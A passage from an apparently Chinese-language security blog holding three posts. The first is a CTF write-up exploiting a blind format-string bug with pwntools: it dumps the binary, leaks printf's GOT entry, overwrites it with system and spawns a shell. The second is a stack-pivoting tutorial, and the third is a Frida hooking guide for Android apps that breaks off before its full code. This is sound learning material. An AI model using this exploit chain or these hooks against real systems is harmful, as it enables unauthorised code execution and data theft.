<span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">		new_c[i - j - <span class="number">1</span>] = b[j]</span><br><span class="line"></span><br><span class="line">	j -= <span class="number">2</span></span><br><span class="line">	res = <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(j+<span class="number">1</span>):</span><br><span class="line">		<span class="keyword">if</span> (new_c[i] &gt; <span class="number">47</span>) &amp; (new_c[i] &lt; <span class="number">60</span>):</span><br><span class="line">			res += <span class="built_in">pow</span>(<span class="number">16</span>,i) * (new_c[i] - <span class="number">48</span>)</span><br><span class="line">		<span class="keyword">elif</span> (new_c[i] &gt; <span class="number">96</span>) &amp; (new_c[i] &lt; <span class="number">103</span>):</span><br><span class="line">			res += <span class="built_in">pow</span>(<span class="number">16</span>,i) * (new_c[i] - <span class="number">87</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    p = process(<span class="string">&#x27;./blind&#x27;</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;%%%d$p&#x27;</span> % i</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    data = p.recv()[:<span class="number">18</span>]</span><br><span class="line">    <span class="keyword">if</span> data.startswith(<span class="string">b&#x27;0x&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(p64(b2i(data,<span class="number">18</span>)))</span><br><span class="line">    p.close()</span><br></pre></td></tr></table></figure>



<h3 id="劫持got"><a href="#劫持got" class="headerlink" title="劫持got"></a>劫持got</h3><p>依然是查看位数和确定字符串偏移：</p>
<p><img src="https://s2.loli.net/2023/04/13/qfaWT7VbCBYkAdh.png" alt="blind"></p>
<p>此时的偏移就有用了，因为要劫持got；</p>
<p>如图可知，偏移为：6，也就是%6$p；</p>
<p>程序一般是从0x400000开始，要劫持got表就需要知道got内容，所以直接用字符串漏洞的方法泄露整个程序的数据：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="comment">#不断地开启关闭程序会有bug的时候，所以泄露三次</span></span><br><span class="line">    <span class="keyword">while</span> num &lt; <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;leak addr: &#x27;</span> + <span class="built_in">hex</span>(addr))</span><br><span class="line">            p = process(<span class="string">&#x27;./blind&#x27;</span>)</span><br><span class="line">            <span class="comment">#偏移为多少，第一个便用多少+2</span></span><br><span class="line">            payload = <span class="string">b&#x27;%00008$s&#x27;</span> + <span class="string">b&#x27;STARTEND&#x27;</span> + p64(addr)</span><br><span class="line">            <span class="comment"># 说明有\n，出现新的一行</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;\x0a&#x27;</span> <span class="keyword">in</span> payload:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            p.sendline(payload)</span><br><span class="line">            data = p.recvuntil(<span class="string">b&#x27;STARTEND&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            num += <span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x400000</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;binary&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> addr &lt; <span class="number">0x401000</span>:</span><br><span class="line">    data = leak(addr)</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        f.write(<span class="string">&#x27;\xff&#x27;</span>)</span><br><span class="line">        addr += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">len</span>(data) == <span class="number">0</span>:</span><br><span class="line">        f.write(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">        addr += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        f.write(<span class="built_in">str</span>(data))</span><br><span class="line">        addr += <span class="built_in">len</span>(data)</span><br></pre></td></tr></table></figure>

<p>通用格式，直接套就行，使用之后便可得到原程序binary；</p>
<p>之后分析binary：</p>
<p><img src="https://s2.loli.net/2023/04/13/fH7oQebC3RAc89q.png" alt="main"></p>
<p>看得出整个程序非常简单；</p>
<p>可以知道的是无法利用栈溢出；</p>
<p>若要劫持got表也只有printf函数的；</p>
<p>所以思路是：</p>
<ul>
<li>泄露printf自身函数地址并计算出system；</li>
<li>覆盖got表；</li>
<li>输入binsh执行system函数成功攻击；</li>
</ul>
<p>代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./blind&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./blind&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">printfgot = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#第一次输入载入so中printf</span></span><br><span class="line">payload = <span class="string">b&#x27;123&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment">#第二次输入泄漏printf，got地址写后面，不然会因为其高地址为0被截断</span></span><br><span class="line">payload = <span class="string">b&#x27;%00008$s&#x27;</span> + <span class="string">b&#x27;\x00aaaaaaa&#x27;</span> +p64(printfgot)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">printfaddr = p.recv()</span><br><span class="line"><span class="comment">#8位地址的高位是0，会被格式化%s截断,调试得高位有两字节为0</span></span><br><span class="line">printfaddr += <span class="string">b&#x27;\x00\x00&#x27;</span></span><br><span class="line">printfaddr = u64(printfaddr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#计算system</span></span><br><span class="line">libc.address = printfaddr - libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">system = p64(system)</span><br><span class="line"></span><br><span class="line"><span class="comment">#第三次输入覆盖</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>, &#123;printfgot: system&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment">#第四次输入执行system</span></span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

</div></div><a class="button-hover more" href="/SecondBC/2023/04/13/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/#more">阅读全文</a></div><div class="recent-post-item"><a class="post-title" href="/SecondBC/2023/04/11/%E6%A0%88%E8%BF%81%E7%A7%BB/">栈迁移</a><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 更新于 2023-04-13</time><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/categories/Diary/">Diary</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/tags/Pwn/">Pwn</a></div></div><div class="post-content"><div class="main-content content"><p>详细见：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/max1z/p/15299000.html">栈迁移原理介绍与应用 - Max1z - 博客园 (cnblogs.com)</a></p>
<p><em><strong>其实际上的作用就是控制esp指向已构造好的payload区（覆盖量不够的情况，可先构造好一段payload到特定的内存段上）；</strong></em></p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>利用栈平衡的操作；</p>
<p>32位调用函数时，会有如下操作发生：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第一步：操作执行流</span></span><br><span class="line">push eip+<span class="number">4</span>			<span class="comment">//保存函数返回地址入栈</span></span><br><span class="line">mov eip, Func		<span class="comment">//执行流进入函数</span></span><br><span class="line">---</span><br><span class="line"><span class="comment">//第二步：构造新栈帧</span></span><br><span class="line">push ebp			<span class="comment">//保存上层函数栈底ebp</span></span><br><span class="line">mov ebp, esp		<span class="comment">//将ebp指向旧ebp的值，也是此函数的栈底</span></span><br><span class="line">add esp, xxh		<span class="comment">//增长栈顶构成新栈帧</span></span><br><span class="line">---</span><br><span class="line"><span class="comment">//第三步：还原上层栈帧形态 Leave</span></span><br><span class="line">mov esp, ebp		<span class="comment">//让esp重新指向此函数的栈底</span></span><br><span class="line">pop ebp				<span class="comment">//将此时esp指向的旧ebp值弹出给ebp，此时ebp指向旧栈底，且esp指向ret的地址</span></span><br><span class="line"><span class="comment">//retn</span></span><br><span class="line">pop eip				<span class="comment">//将此时ret地址的值弹出给执行流，此时esp指向旧栈顶</span></span><br></pre></td></tr></table></figure>

<p>第三步的即为第二部的逆运算，可以称这步为Leave，如果能够劫持在函数里的旧ebp值，就可以使得 pop ebp 到一个可控的地方，栈顶的位置是由ebp的值而控制：mov esp，ebp；从而可能影响esp，从而控制进程流；</p>
<h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p>如下图所示：</p>
<p><img src="https://s2.loli.net/2023/04/13/9KN3pzjikEq7DQM.png" alt="current"></p>
<p>意思是在Leave中，需要颠倒1，2行的内容；</p>
<p>如何颠倒，很简单，用gadget思想；</p>
<p>即首先控制旧ebp和ret地址，让ret地址返回到新的一组Leave中去，此时可以把esp的值控制为第一次的ebp的值，使得栈顶转移到另一处内存空间，达成栈迁移；</p>
<p>执行流程：</p>
<ol>
<li>使用gadget寻找新一组的Leave地址：NewLeaveAddr，以及目标栈顶位置：AimAddr；</li>
<li>覆盖旧址ebp为 AimAddr-4 （64位-8，因为第二次执行Leave时，会再次pop ebp，使得esp下降，即往高地址走一格）</li>
<li>覆盖ret地址为 NewLeaveAddr；</li>
</ol>
<p>执行之后，新的栈顶指向AimAddr（此时还未执行pop eip），栈底指向AimAddr-4处的数值；</p>
<h2 id="运用情况"><a href="#运用情况" class="headerlink" title="运用情况"></a>运用情况</h2><p>这个技术运用于栈溢出返回字节不够时的情况，此时只用覆盖ebp和ret地址就行；</p>
<p>能够使用该技术的情景：</p>
<ol>
<li>存在leave ret gadget；</li>
<li>存在可执行 payload 的内存段；</li>
</ol>
<p>一般而言，能执行shellcode的地方直接ret就行了，不需要这么复杂，不能执行指令的片段上，此时需要运用在栈上，使得控制的栈帧介于输入的变量缓冲区上，把可覆盖区域尽量拉长，利用已填写的 payload 再次实现经典栈溢出；</p>
<h2 id="使用实例"><a href="#使用实例" class="headerlink" title="使用实例"></a>使用实例</h2><p><img src="https://s2.loli.net/2023/04/13/IevWdjVtYfoHg6J.png" alt="code"></p>
<p>上图为一个栈帧，此时最左侧为变量数组下标0处，也是控制esp指向的目标位置；</p>
<ol>
<li>确定旧ebp与该变量的偏移，因为可以通过格式化字符串泄露旧ebp内容，从而动态地计算出此时此刻变量在栈中的地址：AimAddr；</li>
<li>找到gadget NewLeaveAddr，此时覆盖ebp处为变量地址，ret地址为gadget地址；</li>
<li>可知当执行之后，esp会减少一格到此变量下标1处，且此时（pop eip）即ret还没执行；</li>
</ol>
<p>聪明如你，当现在的情况即是执行ret的时刻，那么后面的内容也就是传统栈溢出所需要填充的内容了；</p>
<p>这个时候就可以在变量上面直接地填写，不需要在变量溢出后填写；</p>
</div></div><a class="button-hover more" href="/SecondBC/2023/04/11/%E6%A0%88%E8%BF%81%E7%A7%BB/#more">阅读全文</a></div><div class="recent-post-item"><a class="post-title" href="/SecondBC/2023/04/11/Frida%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/">Frida学习日记</a><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 更新于 2024-05-11</time><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/categories/Diary/">Diary</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/tags/Bin/">Bin</a></div></div><div class="post-content"><div class="main-content content"><h2 id="下载安装和简要说明"><a href="#下载安装和简要说明" class="headerlink" title="下载安装和简要说明"></a>下载安装和简要说明</h2><p>下载：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install frida-tools</span><br></pre></td></tr></table></figure>



<p>下载 github 上的 frida server，类似ida的server；</p>
<p><a target="_blank" rel="noopener" href="https://github.com/frida/frida/releases">Releases · frida/frida (github.com)</a></p>
<p>需要下载的名称为：frida-server-16.0.10-android-arm64.xz；（模拟器下载x64版本）</p>
<p>之后熟悉adb的使用：(需要root手机，模拟器也行但比较麻烦)</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43927138/article/details/90477966">adb下载安装及使用_Dongs丶的博客-CSDN博客_adb下载</a></p>
<p>需要用到的指令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">adb devices						//查看是否连接到手机设备</span><br><span class="line">adb shell 						//进入手机shell</span><br><span class="line">adb push A/path B/path 			//将电脑上A路径的文件传到手机B路径上 一般B是 /sdcard</span><br><span class="line">---</span><br><span class="line">进入shell后操作：</span><br><span class="line">su								//sudo给权限</span><br><span class="line">mv A/path B/path				//转移（剪切）文件位置A到B，一般放到 /data/local</span><br><span class="line">chmod 777 file 					//赋全权限</span><br></pre></td></tr></table></figure>

<p>使用命令以激活server：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./frida_server64</span><br><span class="line">---</span><br><span class="line">电脑本机操作：</span><br><span class="line">adb forward tcp:27042 tcp:27042	//转发手机端口到电脑</span><br></pre></td></tr></table></figure>

<p>查看APP包名：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell pm list packages -3</span><br></pre></td></tr></table></figure>

<p>MuMu模拟器特殊说法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb connect 127.0.0.1:7555		//以usb连接到模拟器</span><br></pre></td></tr></table></figure>

<p>指定设备转发端口：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb -s ID forward tcp:xxx tcp:xxx</span><br></pre></td></tr></table></figure>



<h2 id="frida常用参数"><a href="#frida常用参数" class="headerlink" title="frida常用参数"></a>frida常用参数</h2><p>执行命令： frida-ps, 展示进程应用；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-f			 //启动app</span><br><span class="line">-R			 //remote</span><br><span class="line">-l			 //load JS 脚本</span><br></pre></td></tr></table></figure>

<p>如加载一个app并装载脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -R -f app包名 -l 脚本.js</span><br></pre></td></tr></table></figure>



<h2 id="Frida实现调用函数"><a href="#Frida实现调用函数" class="headerlink" title="Frida实现调用函数"></a>Frida实现调用函数</h2><p>用Jeb找到包名，类名，以及函数名及其调用约定；</p>
<p>编写JS执行：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> ClassName = Java.use(<span class="string">&quot;PackageName.ClassName&quot;</span>)				<span class="comment">//定义一个类常量</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//一般新建变量用let</span></span><br><span class="line">    <span class="keyword">let</span> ObjectName = ClassName.$new()								<span class="comment">//实例化类，有静态修饰的不用做这一步</span></span><br><span class="line">    																<span class="comment">//new里面可加参数</span></span><br><span class="line">    <span class="comment">//如实例化一个字符串类</span></span><br><span class="line">    <span class="keyword">const</span> stringClass = Java.use(<span class="string">&quot;java.lang.String&quot;</span>)</span><br><span class="line">    <span class="keyword">let</span> res = ObejectName.MethodName( stringClass.$new(<span class="string">&#x27;123&#x27;</span>) )		<span class="comment">//执行方法且实例化并得到结果</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//base64</span></span><br><span class="line">    <span class="keyword">const</span> b64Class = Java.use(<span class="string">&quot;android.util.Base64&quot;</span>)</span><br><span class="line">    <span class="built_in">console</span>.log( b64Class.encodeToString(res,<span class="number">0</span>) )					<span class="comment">//打印base64编码res信息到调试窗</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>总结：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//开头</span></span><br><span class="line">Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;)											<span class="comment">//内容写在大括号里</span></span><br><span class="line">---</span><br><span class="line"><span class="comment">//使用类</span></span><br><span class="line">Java.use(<span class="string">&quot;PakageName.ClassName&quot;</span>)</span><br><span class="line">---</span><br><span class="line"><span class="comment">//实例化</span></span><br><span class="line">ClassName.$new()</span><br><span class="line">---</span><br><span class="line"><span class="comment">//打印信息</span></span><br><span class="line"><span class="built_in">console</span>.log()</span><br></pre></td></tr></table></figure>



<h2 id="Frida简单实现hook-java层"><a href="#Frida简单实现hook-java层" class="headerlink" title="Frida简单实现hook-java层"></a>Frida简单实现hook-java层</h2><p>不管是否静态，可以如下书写：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ClassName.FuncName.implementation = <span class="function"><span class="keyword">function</span>(<span class="params">p1,p2,...</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//your aim...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//同种写法</span></span><br><span class="line">ClassName[<span class="string">&quot;FuncName&quot;</span>].implementation = <span class="function"><span class="keyword">function</span>(<span class="params">p1,p2,...</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//your aim...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也是需要和上面的一样，先构造类常量，然后实例化；</p>
<p>此写法是直接覆盖原函数的内容，不会执行原本函数的内容，所以要规定好调用约定，返回对应的内容；</p>
<p>在改写函数中使用：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">this</span>.FuncName(...)</span><br></pre></td></tr></table></figure>

<p>可以实现调用此类的原函数；</p>
<p>如果函数有重载，则写法如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ClassName.FuncName.overload(<span class="string">&#x27;&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">p1,p2,...</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//your aim...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>单引号里是参数的类型，如果是基本类型，则表示法为： <code>[B</code>    表示为byte；</p>
<p>如果是类类型，则直接输入其对应包的对应类名就行，如String类型： <code>java.lang.String</code>；</p>
<p>一般而言，对于java常用类的函数hook，要有过滤，即对应地方调用的参数特点做出if判断并更改代码逻辑；</p>
<p>因为很多地方也会调用到相同的函数，此时就直接返回 this.FuncName() ，就不会使得程序崩溃；</p>
<h2 id="Hook-so层"><a href="#Hook-so层" class="headerlink" title="Hook so层"></a>Hook so层</h2><p>hook so层要注意一点，要当so文件动态链接到应用后，才能调用其函数，不然会空指针报错，这和pwn的ret2libc一个道理；</p>
<p>hook so一般有两种方法，这里先介绍第一种，导出表 Export，找到导出的地址；</p>
<p>操作so层时不用 java.use ，用拦截器： Interceptor；</p>
<p>这里用获取一个函数传参结构体的打印代码解释：</p>
<p>假设原代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = AimFunc(a1,a2,&amp;v16,...);</span><br></pre></td></tr></table></figure>

<p>此时第三个参数便是此时需要获取的结构体地址；</p>
<p>在32位程序中，指针占4字节，而结构体的地址过去第一个字段是真实的结构体数据的指针，隔了4个字节之后的，是这个结构体的大小；</p>
<p>那么对应hook代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//此函数接收一个指针，一般指向hook函数</span></span><br><span class="line">Interceptor.attach( Module.findExportByName(<span class="string">&#x27;your_so.so&#x27;</span>,<span class="string">&#x27;FuncName&#x27;</span>),	<span class="comment">//根据so文件名和函数名通过Export找</span></span><br><span class="line">                  <span class="comment">//第二个参数是回调函数</span></span><br><span class="line">                   &#123;</span><br><span class="line">    				<span class="comment">//函数开始时</span></span><br><span class="line">    					<span class="function"><span class="title">onEnter</span>(<span class="params">args</span>)</span>&#123;</span><br><span class="line">                            <span class="keyword">let</span> size = args[<span class="number">2</span>].add(<span class="number">0x4</span>).readu32()	<span class="comment">//args[2]也就是函数的第三个参数，加4得到结构体地址第二个字段地址</span></span><br><span class="line">                            <span class="comment">//将内容当作指针读取，再读取真实的结构体数据</span></span><br><span class="line">                            <span class="keyword">let</span> data = args[<span class="number">2</span>].readPointer().readByteArray(size)</span><br><span class="line">                            </span><br><span class="line">                           	<span class="built_in">console</span>.log(data)	<span class="comment">//打印data</span></span><br><span class="line">                        &#125;,</span><br><span class="line">    				<span class="comment">//函数结束时,参数为返回值</span></span><br><span class="line">    					<span class="function"><span class="title">onLeave</span>(<span class="params">retval</span>)</span>&#123;</span><br><span class="line">                            </span><br><span class="line">                        &#125;</span><br><span class="line">				   &#125;</span><br><span class="line">                  )</span><br></pre></td></tr></table></figure>

<p>此时直接跑是会报错的，因为正如前面所述，在程序开始运行的时候就直接去寻找模块了，但是因为so还没有动态地链接，所以找不到，会得到一个null指针；</p>
<p>此时的解决思路是：找到加载此so文件的函数，先去hook掉java层的 LoadLibrary，再对比此时传入 LoadLibrary 参数是否是目标so文件，如果是，则再实现上面的代码，如果不是，则实现原函数代码内容；</p>
<p>通过java层的源码分析可以知道：LoadLibrary 的实现是 调用了一个 LoadLibrary0(a1,a2,a3)去实现主要代码的，而主要代码的逻辑是：<strong>如果传入的字符串是存在的so文件，那么就会直接在其中调用 nativeLoad 函数</strong>；</p>
<p>而 nativeload 函数也会层层调用，最后会找到一个三参的 nativeload，原型如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title">nativeLoad</span><span class="params">(String filename, ClassLoader loader, Class&lt;?&gt; caller)</span></span>;</span><br></pre></td></tr></table></figure>

<p>此时需要hook的函数，也就是这上面这个了；</p>
<p>主要代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//因为hook java层，所以用java.use，上述目标函数在runtime里</span></span><br><span class="line"><span class="keyword">const</span> runtimeClass = Java.use(<span class="string">&#x27;java.lang.Runtime&#x27;</span>)</span><br><span class="line"><span class="comment">//hook目标函数</span></span><br><span class="line">runtimeClass.nativeLoad.overload(<span class="string">&#x27;java.lang.String&#x27;</span>,<span class="string">&#x27;java.lang.ClassLoader&#x27;</span>,<span class="string">&#x27;java.lang.Class&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">p1,p2,p3</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//调用一次原函数，使得so文件被装载</span></span><br><span class="line">    <span class="keyword">let</span> res = <span class="built_in">this</span>.nativeLoad(p1,p2,p3)</span><br><span class="line">    <span class="comment">//查找第一个参数里是否带目标so文件的路径字符串</span></span><br><span class="line">    <span class="keyword">if</span>(p1.indexOf(<span class="string">&#x27;your_so.so&#x27;</span>) != -<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//hook so层实现</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果想要将想要的data数据dump出，可以用以下代码(frida提供)：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//路径 + 大小 + 后缀名 (总名称)</span></span><br><span class="line"><span class="keyword">let</span> file = <span class="keyword">new</span> File(<span class="string">&#x27;/sdcard/&#x27;</span> + size + <span class="string">&#x27;.bin&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">file.write(data)</span><br><span class="line">file.flush()</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>

<p>完整代码如下：</p>
